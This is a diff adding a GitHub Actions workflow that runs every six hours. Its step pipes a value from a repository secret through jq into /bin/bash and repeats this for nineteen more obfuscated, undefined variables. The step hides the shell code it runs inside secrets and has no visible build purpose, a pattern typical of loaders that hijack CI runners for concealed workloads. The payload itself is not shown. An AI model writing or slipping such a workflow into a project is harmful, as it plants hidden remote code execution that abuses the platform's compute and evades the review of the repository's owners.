@@ -1,0 +1,35 @@
+name: tengzijing5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tengzijing5678
+        env:
+          l42266: ${{ secrets.l42266 }}
+        run: |
+          echo $l42266 | jq -r .ya52294 | /bin/bash
+          echo $w17895 | jq -r .dn9 | /bin/bash
+          echo $p9334 | jq -r .b957 | /bin/bash
+          echo $ig522 | jq -r .jghqu9027 | /bin/bash
+          echo $noyqy5 | jq -r .wnt16464 | /bin/bash
+          echo $ps94 | jq -r .p8626 | /bin/bash
+          echo $hfoo5 | jq -r .qc19 | /bin/bash
+          echo $wbli1560 | jq -r .cn74311 | /bin/bash
+          echo $p30 | jq -r .apckq3550 | /bin/bash
+          echo $k0165 | jq -r .sx425 | /bin/bash
+          echo $ni09342 | jq -r .qqc98222 | /bin/bash
+          echo $upy41233 | jq -r .xqrkq9 | /bin/bash
+          echo $bo383 | jq -r .iduxb69 | /bin/bash
+          echo $xbcb735 | jq -r .ssiky7 | /bin/bash
+          echo $uwkl815 | jq -r .l09209 | /bin/bash
+          echo $vthje4842 | jq -r .qkgfz0973 | /bin/bash
+          echo $xfmr24585 | jq -r .p71 | /bin/bash
+          echo $bzxh4883 | jq -r .rwxj26877 | /bin/bash
+          echo $ooo71517 | jq -r .pmtx973 | /bin/bash
+          echo $tqzsw93 | jq -r .bwj2 | /bin/bash
+
